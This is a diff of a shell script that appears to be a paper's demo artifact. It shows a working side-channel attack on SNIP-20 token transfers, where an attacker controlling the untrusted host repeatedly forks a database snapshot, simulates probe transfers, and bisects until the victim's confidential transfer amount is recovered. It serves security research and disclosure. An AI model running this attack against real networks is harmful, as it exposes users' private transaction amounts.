@@ -8,19 +8,25 @@ source ./scripts/local_test_params.sh
 CONTRACT_ADDRESS=$(cat $BACKUP/contractAddress.txt)
 CODE_HASH=$(cat $BACKUP/codeHash.txt)
 
+teebox info-panel "Artifact for Section 5.3" --title "Inferring SNIP-20 Transfer Amounts"
+teebox info-panel $'Sandy: Sender of the transaction being attacked\nAtako: Attacker who can modify the untrusted code base and simulate transactions' --title "Cast of Characters"
+
+sender=${ACC0}
+attacker=${ACC1}
 AMOUNT='10'
 
 snapshot_uniq_label=$(date '+%Y-%m-%d-%H:%M:%S')
 set_snapshot "${snapshot_uniq_label}-start"
 
-# generate victim tx: ACC0 -> ACC2
-#generate_and_sign_transfer $ACC0 $ACC2 $AMOUNT snip20_victim
-teebox log "generate victim tx: ACC0 -> ACC2"
-teebox log "Generate SNIP20 transfer tx of $AMOUNT tokens from sender $ACC0 to receiver $ACC2"
-generate_and_sign_transfer $ACC0 $ACC2 $AMOUNT snip20_victim
+teebox info-panel ":warning: :construction: [red dim]In a real-world scenario this transaction would already exist, and could be fetched from the blockchain[/] :construction: :warning:" --title "Initialization of Victim Transaction"
+# generate victim tx: sender -> ACC2
+#generate_and_sign_transfer ${sender} $ACC2 ${AMOUNT} snip20_victim
+teebox log "generate victim tx: sender -> ACC2"
+teebox log "Generate SNIP20 sender transfer tx of [bold]T=${AMOUNT}[/] tokens from sender ${sender} to receiver $ACC2"
+generate_and_sign_transfer ${sender} $ACC2 ${AMOUNT} snip20_victim
 teebox log "Transaction is saved under tx_snip20_victim.json"
-teebox print-json "tx_snip20_victim_sign.json"
-teebox info-panel "${AMOUNT} tokens" --title "Transfer Transaction Amount"
+#teebox print-json "tx_snip20_victim_sign.json"
+#teebox info-panel "${AMOUNT} tokens" --title "Transfer Transaction Amount"
 
 rm -f $BACKUP/victim_key
 rm -f $BACKUP/adv_key
@@ -30,9 +36,11 @@ touch $BACKUP/adv_key
 touch $BACKUP/adv_value
 
 # get victim key
+echo
+teebox info-panel "using access pattern analysis" --title "Sender's Balance Database Key Inferrence"
 teebox log "Get victim database lookup key :key: :open_file_folder: ..."
 teebox log "Generate transfer tx: attacker account --> victim account"
-generate_and_sign_transfer $ACC1 $ACC0 $AMOUNT snip20_getkey
+generate_and_sign_transfer ${attacker} ${sender} ${AMOUNT} snip20_getkey
 rm -f $BACKUP/kv_store
 touch $BACKUP/kv_store
 
@@ -47,40 +55,66 @@ echo
 tag=${tag:6:-1}
 echo $tag > $BACKUP/backup_victim_key
 
-lo=0
-hi=40
+# function TransferAmountInferenceAttack(Tx_victim)
+
+low=0
+high=40
 cnt=0
-while [ $(expr $hi - $lo) -ne 0 ]; do
-    midv=$(( (hi + lo ) / 2))
-    teebox info-panel "lo: $lo, hi: $hi, midv: $midv" --title "Iteration ${cnt}"
+while [ $(expr ${high} - ${low}) -ne 0 ]; do
+    # P := (low+high)/2
+    probe=$(( (high + low ) / 2))
+
+    teebox info-panel ":mag: Iteration ${cnt} :mag:" --title "Bisection Search for the Transfer Amount"
+    teebox log "[bold]low=${low}[/], [bold]high=${high}[/], [bold]probe=${probe}[/]"
+    #teebox log "[bold]low=${low}[/], [bold]high=${high}[/]"
+    #teebox log "Set [bold]probe=(high+low)/2[/]"
+    #teebox log "[bold]probe=${probe}[/]"
     echo
     
     #lookup_key=$(cat $BACKUP/backup_victim_key)
     #teebox log "lookup key: $lookup_key"
     cp -f $BACKUP/backup_victim_key $BACKUP/victim_key
 
-    teebox log "Set snapshot of database"
+    # Fork()
+    teebox log "Fork() (set snapshot of database)"
+    # TODO what does this do exactly?
     set_snapshot "${snapshot_uniq_label}-${cnt}"
+
+    # TODO What is doing that?
+    teebox log "Replay(balance\[sender]=0) (reset balance of victim to zero)" 
     
-    generate_and_sign_transfer $ACC1 $ACC0 $midv snip20_adv
-    teebox log "Simulate transfer transaction from attacker to victim for the amount of $midv tokens"
+    # Figure 5 in paper, line 11
+    # Simulate(Transfer(attacker, sender, P))
+    #teebox log "Simulate transfer transaction from attacker to victim for the amount of [bold]probe[/]=${probe} tokens"
+    teebox log "[bold]Simulate(Transfer(attacker, sender, probe=${probe}))[/]"
+    generate_and_sign_transfer ${attacker} ${sender} ${probe} snip20_adv
     simulate_tx snip20_adv
-    res1=$(cat $BACKUP/simulate_result)
-    teebox log "res1: $res1"
-    echo
+    #simulate_tx_attacker_result=$(cat $BACKUP/simulate_result)
+    #teebox log "[bold]Simulate(Tx_attacker)[/] result: $simulate_tx_attacker_result"
 
-    teebox log "Replay the victim's transfer transaction of $AMOUNT tokens"
+    #teebox log "Replay the victim's transfer transaction of ${AMOUNT} tokens"
+    teebox log "[bold]Simulate(Tx_victim)[/]"
     simulate_tx snip20_victim
-    res2=$(cat $BACKUP/simulate_result)
-    teebox log "res2: $res2"
+    simulate_tx_victim_result=$(cat $BACKUP/simulate_result)
+    #teebox log "Result: $simulate_tx_victim_result"
     echo
 
-    if [ $res2 != 0 ]; then ((lo=midv+1)); else hi=$midv; fi
+    if [ $simulate_tx_victim_result != 0 ]; then
+        ((low=probe+1));
+        teebox log "Simulation of victim transaction [green]succeeded[/], set [bold]low[/] to [bold]probe+1=${low}[/])"
+    else
+        teebox log "Simulation of victim transaction [red]failed[/], set [bold]high[/] to [bold]probe=${probe}[/])"
+        high=${probe};
+    fi
+
     cnt=$((cnt + 1))
 
-    teebox log "After simulations:"
-    teebox log "lo: $lo, hi: $hi, midv: $midv"
+    #teebox log "After simulations:"
+    #teebox log "low: ${low}, high: ${high}, probe: ${probe}"
+    teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to execute the next iteration of the bisection search ..."
+    echo
+    echo
     echo
 done
-text="$lo tokens"
+text="${low} tokens"
 teebox info-panel "${text}" --title "Inferred Transfer Amount"
